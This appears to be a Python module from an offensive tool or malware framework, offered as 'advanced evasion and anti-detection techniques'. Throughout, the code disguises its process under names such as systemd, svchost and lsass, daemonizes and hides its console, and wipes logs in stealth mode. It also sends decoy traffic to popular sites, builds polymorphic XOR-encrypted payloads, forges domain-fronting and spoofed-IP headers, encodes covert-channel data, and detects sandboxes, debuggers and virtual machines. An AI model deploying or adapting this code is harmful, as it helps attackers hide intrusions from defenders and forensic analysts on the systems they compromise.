"""
Advanced evasion and anti-detection techniques
"""

import os
import sys
import time
import random
import socket
import threading
import subprocess
from typing import List, Dict, Any, Optional, Callable
from pathlib import Path
import hashlib
import base64
from core.logger import logger
from core.utils import NetworkUtils, SystemUtils, CryptoUtils


class AntiDetection:
    """Anti-detection and anti-forensics techniques"""
    
    def __init__(self):
        self.detection_methods = {
            'process_hiding': self._hide_process,
            'memory_cleaning': self._clean_memory,
            'log_obfuscation': self._obfuscate_logs,
            'network_masking': self._mask_network_activity,
            'timing_randomization': self._randomize_timing
        }
        
        self.active_techniques = set()
        self.cleanup_callbacks = []
    
    def enable_technique(self, technique: str) -> bool:
        """Enable specific anti-detection technique"""
        if technique in self.detection_methods:
            try:
                self.detection_methods[technique]()
                self.active_techniques.add(technique)
                logger.security_log(f"Enabled anti-detection technique: {technique}")
                return True
            except Exception as e:
                logger.error(f"Failed to enable technique {technique}: {e}")
                return False
        return False
    
    def enable_all_techniques(self):
        """Enable all available anti-detection techniques"""
        for technique in self.detection_methods:
            self.enable_technique(technique)
    
    def _hide_process(self):
        """Hide process from system monitoring - Linux compatible"""
        try:
            if sys.platform.startswith('linux'):
                # Linux process hiding techniques
                try:
                    # Change process name (prctl method)
                    import ctypes
                    import ctypes.util
                    
                    libc = ctypes.CDLL(ctypes.util.find_library('c'))
                    PR_SET_NAME = 15
                    
                    # Set a benign process name
                    benign_names = [
                        b'systemd', b'kthreadd', b'ksoftirqd/0', b'migration/0',
                        b'rcu_gp', b'rcu_par_gp', b'kworker/0:0H', b'mm_percpu_wq',
                        b'ksoftirqd/1', b'migration/1', b'rcu_preempt', b'rcuog/0'
                    ]
                    
                    new_name = random.choice(benign_names)
                    libc.prctl(PR_SET_NAME, new_name, 0, 0, 0)
                    
                    logger.security_log(f"Process name changed to: {new_name.decode()}")
                    
                except Exception as e:
                    logger.debug(f"Linux process name change failed: {e}")
                
                # Try to hide from process tree
                try:
                    # Fork and detach from parent
                    if os.fork() > 0:
                        os._exit(0)
                    
                    # Create new session
                    os.setsid()
                    
                    # Second fork to prevent zombie
                    if os.fork() > 0:
                        os._exit(0)
                    
                    # Change working directory
                    os.chdir('/')
                    
                    # Close file descriptors
                    import resource
                    maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
                    if maxfd == resource.RLIM_INFINITY:
                        maxfd = 1024
                    
                    for fd in range(maxfd):
                        try:
                            os.close(fd)
                        except OSError:
                            pass
                    
                    # Redirect standard file descriptors
                    os.open('/dev/null', os.O_RDWR)  # stdin
                    os.dup2(0, 1)  # stdout
                    os.dup2(0, 2)  # stderr
                    
                except Exception as e:
                    logger.debug(f"Process daemonization failed: {e}")
            
            elif sys.platform == "win32":
                # Windows process hiding (fallback)
                try:
                    import ctypes
                    from ctypes import wintypes
                    
                    # Hide console window
                    kernel32 = ctypes.windll.kernel32
                    user32 = ctypes.windll.user32
                    
                    # Get console window
                    console_window = kernel32.GetConsoleWindow()
                    if console_window:
                        user32.ShowWindow(console_window, 0)  # SW_HIDE
                    
                    # Change process name in memory
                    process_names = [
                        'svchost.exe', 'explorer.exe', 'winlogon.exe',
                        'csrss.exe', 'lsass.exe', 'services.exe'
                    ]
                    
                    new_name = random.choice(process_names)
                    
                    # Use SetConsoleTitleW to change visible name
                    kernel32.SetConsoleTitleW(new_name)
                    
                    logger.security_log(f"Process name changed to: {new_name}")
                    
                except Exception as e:
                    logger.debug(f"Windows process hiding failed: {e}")
            
            # Cross-platform techniques
            try:
                # Change process priority to appear less suspicious
                import psutil
                current_process = psutil.Process()
                
                if sys.platform.startswith('linux'):
                    # Set nice value (lower priority)
                    os.nice(10)
                elif sys.platform == "win32":
                    # Set below normal priority
                    current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
                
                logger.security_log("Process priority adjusted")
                
            except Exception as e:
                logger.debug(f"Process priority adjustment failed: {e}")
            
        except Exception as e:
            logger.error(f"Process hiding failed: {e}")
    
    def _clean_memory(self):
        """Clean sensitive data from memory"""
        try:
            # Force garbage collection
            import gc
            gc.collect()
            
            # Overwrite sensitive variables
            sensitive_vars = ['password', 'key', 'token', 'secret']
            frame = sys._getframe()
            while frame:
                for var_name in list(frame.f_locals.keys()):
                    if any(sensitive in var_name.lower() for sensitive in sensitive_vars):
                        if isinstance(frame.f_locals[var_name], str):
                            frame.f_locals[var_name] = 'X' * len(frame.f_locals[var_name])
                frame = frame.f_back
            
            logger.security_log("Memory cleaning completed")
            
        except Exception as e:
            logger.error(f"Memory cleaning failed: {e}")
    
    def _obfuscate_logs(self):
        """Obfuscate log entries"""
        try:
            # Enable log obfuscation in logger
            logger.enable_obfuscation()
            logger.security_log("Log obfuscation enabled")
            
        except Exception as e:
            logger.error(f"Log obfuscation failed: {e}")
    
    def _mask_network_activity(self):
        """Mask network activity patterns"""
        try:
            # Randomize network timing
            self.network_delay_range = (0.1, 2.0)
            self.packet_size_variation = True
            
            logger.security_log("Network activity masking enabled")
            
        except Exception as e:
            logger.error(f"Network masking failed: {e}")
    
    def _randomize_timing(self):
        """Randomize operation timing"""
        try:
            # Set random delays for operations
            self.timing_randomization = True
            self.min_delay = 0.05
            self.max_delay = 0.5
            
            logger.security_log("Timing randomization enabled")
            
        except Exception as e:
            logger.error(f"Timing randomization failed: {e}")
    
    def add_cleanup_callback(self, callback: Callable):
        """Add cleanup callback for shutdown"""
        self.cleanup_callbacks.append(callback)
    
    def cleanup(self):
        """Perform cleanup operations"""
        try:
            # Execute cleanup callbacks
            for callback in self.cleanup_callbacks:
                try:
                    callback()
                except Exception as e:
                    logger.error(f"Cleanup callback failed: {e}")
            
            # Clear sensitive data
            self._clean_memory()
            
            # Clear logs if in stealth mode
            if logger.stealth_mode:
                logger.clear_logs()
            
            logger.security_log("Anti-detection cleanup completed")
            
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")


class EvasionManager:
    """Comprehensive evasion management system"""
    
    def __init__(self):
        self.anti_detection = AntiDetection()
        self.evasion_techniques = {
            'ip_spoofing': self._enable_ip_spoofing,
            'packet_fragmentation': self._enable_packet_fragmentation,
            'protocol_switching': self._enable_protocol_switching,
            'traffic_shaping': self._enable_traffic_shaping,
            'decoy_traffic': self._enable_decoy_traffic,
            'timing_attacks': self._enable_timing_attacks
        }
        
        self.active_evasions = set()
        self.spoofed_ips = []
        self.decoy_threads = []
    
    def enable_evasion(self, technique: str, **kwargs) -> bool:
        """Enable specific evasion technique"""
        if technique in self.evasion_techniques:
            try:
                self.evasion_techniques[technique](**kwargs)
                self.active_evasions.add(technique)
                logger.security_log(f"Enabled evasion technique: {technique}")
                return True
            except Exception as e:
                logger.error(f"Failed to enable evasion {technique}: {e}")
                return False
        return False
    
    def enable_stealth_mode(self):
        """Enable comprehensive stealth mode"""
        logger.enable_stealth_mode()
        self.anti_detection.enable_all_techniques()
        
        # Enable key evasion techniques
        self.enable_evasion('traffic_shaping')
        self.enable_evasion('timing_attacks')
        self.enable_evasion('decoy_traffic')
        
        logger.security_log("Stealth mode activated")
    
    def _enable_ip_spoofing(self, **kwargs):
        """Enable IP address spoofing"""
        try:
            # Generate spoofed IP addresses
            self.spoofed_ips = [
                NetworkUtils.generate_random_ip() 
                for _ in range(kwargs.get('count', 10))
            ]
            
            logger.security_log(f"IP spoofing enabled with {len(self.spoofed_ips)} addresses")
            
        except Exception as e:
            logger.error(f"IP spoofing failed: {e}")
    
    def _enable_packet_fragmentation(self, **kwargs):
        """Enable packet fragmentation"""
        try:
            self.fragment_size = kwargs.get('fragment_size', 1024)
            self.fragmentation_enabled = True
            
            logger.security_log(f"Packet fragmentation enabled (size: {self.fragment_size})")
            
        except Exception as e:
            logger.error(f"Packet fragmentation failed: {e}")
    
    def _enable_protocol_switching(self, **kwargs):
        """Enable protocol switching"""
        try:
            self.protocols = kwargs.get('protocols', ['TCP', 'UDP', 'ICMP'])
            self.protocol_switching = True
            
            logger.security_log(f"Protocol switching enabled: {', '.join(self.protocols)}")
            
        except Exception as e:
            logger.error(f"Protocol switching failed: {e}")
    
    def _enable_traffic_shaping(self, **kwargs):
        """Enable traffic shaping"""
        try:
            self.traffic_shaping = {
                'enabled': True,
                'min_delay': kwargs.get('min_delay', 0.01),
                'max_delay': kwargs.get('max_delay', 0.1),
                'burst_size': kwargs.get('burst_size', 10),
                'burst_delay': kwargs.get('burst_delay', 1.0)
            }
            
            logger.security_log("Traffic shaping enabled")
            
        except Exception as e:
            logger.error(f"Traffic shaping failed: {e}")
    
    def _enable_decoy_traffic(self, **kwargs):
        """Enable decoy traffic generation"""
        try:
            decoy_count = kwargs.get('decoy_count', 3)
            
            for i in range(decoy_count):
                thread = threading.Thread(
                    target=self._generate_decoy_traffic,
                    args=(i,),
                    daemon=True
                )
                thread.start()
                self.decoy_threads.append(thread)
            
            logger.security_log(f"Decoy traffic enabled with {decoy_count} threads")
            
        except Exception as e:
            logger.error(f"Decoy traffic failed: {e}")
    
    def _enable_timing_attacks(self, **kwargs):
        """Enable timing-based evasion"""
        try:
            self.timing_attacks = {
                'enabled': True,
                'jitter': kwargs.get('jitter', 0.1),
                'pattern_breaking': kwargs.get('pattern_breaking', True),
                'random_delays': kwargs.get('random_delays', True)
            }
            
            logger.security_log("Timing attacks enabled")
            
        except Exception as e:
            logger.error(f"Timing attacks failed: {e}")
    
    def _generate_decoy_traffic(self, thread_id: int):
        """Generate decoy network traffic - Linux compatible"""
        try:
            decoy_targets = [
                'google.com',
                'microsoft.com', 
                'amazon.com',
                'cloudflare.com',
                'github.com',
                'stackoverflow.com',
                'reddit.com',
                'wikipedia.org'
            ]
            
            while True:
                target = random.choice(decoy_targets)
                try:
                    # Generate benign HTTP request
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    # Resolve hostname to IP
                    try:
                        target_ip = socket.gethostbyname(target)
                        sock.connect((target_ip, 80))
                    except socket.gaierror:
                        # If DNS resolution fails, try direct connection
                        sock.connect((target, 80))
                    
                    # Send HTTP request
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\nConnection: close\r\n\r\n"
                    sock.send(request.encode())
                    
                    # Read response (limited)
                    response = sock.recv(1024)
                    sock.close()
                    
                    # Linux-specific network operations
                    if sys.platform.startswith('linux'):
                        # Generate additional decoy traffic using different methods
                        try:
                            # ICMP ping (requires root privileges)
                            subprocess.run(['ping', '-c', '1', target], 
                                         capture_output=True, timeout=5)
                        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
                            pass
                        
                        # DNS lookup
                        try:
                            subprocess.run(['nslookup', target], 
                                         capture_output=True, timeout=5)
                        except (subprocess.TimeoutExpired, FileNotFoundError):
                            pass
                    
                    # Random delay between requests
                    delay = random.uniform(10, 60)  # 10-60 seconds
                    time.sleep(delay)
                    
                except Exception as e:
                    logger.debug(f"Decoy traffic to {target} failed: {e}")
                    time.sleep(random.uniform(5, 15))
                    
        except Exception as e:
            logger.error(f"Decoy traffic thread {thread_id} failed: {e}")
            
        finally:
            logger.debug(f"Decoy traffic thread {thread_id} terminated")
    
    def get_spoofed_ip(self) -> str:
        """Get random spoofed IP address"""
        if self.spoofed_ips:
            return random.choice(self.spoofed_ips)
        return NetworkUtils.generate_random_ip()
    
    def apply_traffic_shaping(self):
        """Apply traffic shaping delay"""
        if hasattr(self, 'traffic_shaping') and self.traffic_shaping['enabled']:
            delay = random.uniform(
                self.traffic_shaping['min_delay'],
                self.traffic_shaping['max_delay']
            )
            time.sleep(delay)
    
    def apply_timing_evasion(self):
        """Apply timing-based evasion"""
        if hasattr(self, 'timing_attacks') and self.timing_attacks['enabled']:
            if self.timing_attacks['random_delays']:
                jitter = self.timing_attacks['jitter']
                delay = random.uniform(0, jitter)
                time.sleep(delay)
    
    def cleanup(self):
        """Cleanup evasion resources"""
        try:
            # Stop decoy threads
            for thread in self.decoy_threads:
                if thread.is_alive():
                    # Threads are daemon threads, they'll stop automatically
                    pass
            
            # Cleanup anti-detection
            self.anti_detection.cleanup()
            
            logger.security_log("Evasion manager cleanup completed")
            
        except Exception as e:
            logger.error(f"Evasion cleanup failed: {e}")


class AdvancedEvasion:
    """Advanced evasion techniques"""
    
    @staticmethod
    def polymorphic_payload(payload: bytes) -> bytes:
        """Create polymorphic payload"""
        try:
            # Simple polymorphic transformation
            key = os.urandom(16)
            encrypted = CryptoUtils.xor_encrypt(payload, key)
            
            # Add random padding
            padding_size = random.randint(10, 100)
            padding = os.urandom(padding_size)
            
            # Combine key, padding, and encrypted payload
            result = key + padding + encrypted
            
            return result
            
        except Exception as e:
            logger.error(f"Polymorphic payload creation failed: {e}")
            return payload
    
    @staticmethod
    def domain_fronting(original_host: str) -> Dict[str, str]:
        """Generate domain fronting headers"""
        try:
            # Common CDN domains for fronting
            cdn_domains = [
                'cloudfront.net',
                'fastly.com',
                'cloudflare.com',
                'akamai.net',
                'amazonaws.com'
            ]
            
            front_domain = random.choice(cdn_domains)
            
            return {
                'Host': original_host,
                'X-Forwarded-Host': front_domain,
                'X-Real-IP': NetworkUtils.generate_random_ip(),
                'X-Forwarded-For': NetworkUtils.generate_random_ip()
            }
            
        except Exception as e:
            logger.error(f"Domain fronting failed: {e}")
            return {'Host': original_host}
    
    @staticmethod
    def generate_noise_data(size: int = 1024) -> bytes:
        """Generate noise data for obfuscation"""
        try:
            # Generate structured noise that looks like legitimate data
            noise_patterns = [
                b'HTTP/1.1 200 OK\r\n',
                b'Content-Type: text/html\r\n',
                b'<html><body>',
                b'{"status": "ok", "data": "',
                b'<?xml version="1.0"?>'
            ]
            
            noise = b''
            while len(noise) < size:
                pattern = random.choice(noise_patterns)
                noise += pattern
                noise += os.urandom(random.randint(10, 50))
            
            return noise[:size]
            
        except Exception as e:
            logger.error(f"Noise data generation failed: {e}")
            return os.urandom(size)
    
    @staticmethod
    def covert_channel_encoding(data: bytes) -> str:
        """Encode data using covert channel techniques"""
        try:
            # Base64 encode with random padding
            encoded = base64.b64encode(data).decode()
            
            # Add random characters as steganographic cover
            result = ""
            for i, char in enumerate(encoded):
                result += char
                if i % 4 == 0:  # Add noise every 4 characters
                    noise_char = random.choice('abcdefghijklmnopqrstuvwxyz')
                    result += noise_char
            
            return result
            
        except Exception as e:
            logger.error(f"Covert channel encoding failed: {e}")
            return base64.b64encode(data).decode()
    
    @staticmethod
    def anti_sandbox_check() -> bool:
        """Check for sandbox/analysis environment - Linux compatible"""
        try:
            indicators = []
            
            # Cross-platform sandbox process detection
            if sys.platform.startswith('linux'):
                # Linux-specific sandbox/analysis processes
                sandbox_processes = [
                    'vboxservice', 'vmtoolsd', 'vmsrvc',
                    'wireshark', 'tcpdump', 'strace', 'ltrace',
                    'gdb', 'valgrind', 'perf', 'systemtap',
                    'qemu', 'kvm', 'docker', 'containerd',
                    'sandbox', 'firejail', 'bubblewrap'
                ]
                
                try:
                    # Check running processes using ps
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                    process_list = result.stdout.lower()
                    
                    for process in sandbox_processes:
                        if process.lower() in process_list:
                            indicators.append(f"Analysis process detected: {process}")
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
                
                # Check for container environment
                try:
                    # Check for Docker container
                    if os.path.exists('/.dockerenv'):
                        indicators.append("Docker container detected")
                    
                    # Check cgroup for container indicators
                    if os.path.exists('/proc/1/cgroup'):
                        with open('/proc/1/cgroup', 'r') as f:
                            cgroup_content = f.read().lower()
                            if 'docker' in cgroup_content or 'lxc' in cgroup_content:
                                indicators.append("Container environment detected")
                except Exception:
                    pass
                
                # Check for VM indicators in Linux
                try:
                    # Check DMI information
                    dmi_paths = ['/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor']
                    for path in dmi_paths:
                        if os.path.exists(path):
                            with open(path, 'r') as f:
                                content = f.read().lower()
                                vm_indicators = ['virtualbox', 'vmware', 'qemu', 'kvm', 'xen', 'hyper-v']
                                for indicator in vm_indicators:
                                    if indicator in content:
                                        indicators.append(f"VM indicator in DMI: {indicator}")
                except Exception:
                    pass
                
            else:
                # Windows fallback
                sandbox_processes = [
                    'vboxservice.exe', 'vmtoolsd.exe', 'vmsrvc.exe',
                    'sandboxie.exe', 'wireshark.exe', 'procmon.exe'
                ]
                
                try:
                    result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
                    process_list = result.stdout.lower()
                    
                    for process in sandbox_processes:
                        if process.lower() in process_list:
                            indicators.append(f"Sandbox process detected: {process}")
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
            
            # Cross-platform VM artifact detection
            vm_artifacts = ['VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'KVM', 'XEN']
            
            try:
                system_info = SystemUtils.get_system_info()
                for artifact in vm_artifacts:
                    if artifact.lower() in str(system_info).lower():
                        indicators.append(f"VM artifact detected: {artifact}")
            except Exception:
                pass
            
            # Timing-based detection (cross-platform)
            start_time = time.time()
            for _ in range(1000000):
                pass  # Simple CPU-intensive loop
            execution_time = time.time() - start_time
            
            # Adjusted threshold for different platforms
            threshold = 0.15 if sys.platform.startswith('linux') else 0.1
            if execution_time > threshold:
                indicators.append("Slow execution detected (possible VM/container)")
            
            # Linux-specific hardware checks
            if sys.platform.startswith('linux'):
                try:
                    # Check CPU info for virtualization
                    if os.path.exists('/proc/cpuinfo'):
                        with open('/proc/cpuinfo', 'r') as f:
                            cpu_info = f.read().lower()
                            if 'hypervisor' in cpu_info or 'vmware' in cpu_info or 'qemu' in cpu_info:
                                indicators.append("Virtualization detected in CPU info")
                except Exception:
                    pass
            
            if indicators:
                logger.security_log(f"Sandbox/VM indicators found: {', '.join(indicators)}")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Anti-sandbox check failed: {e}")
            return False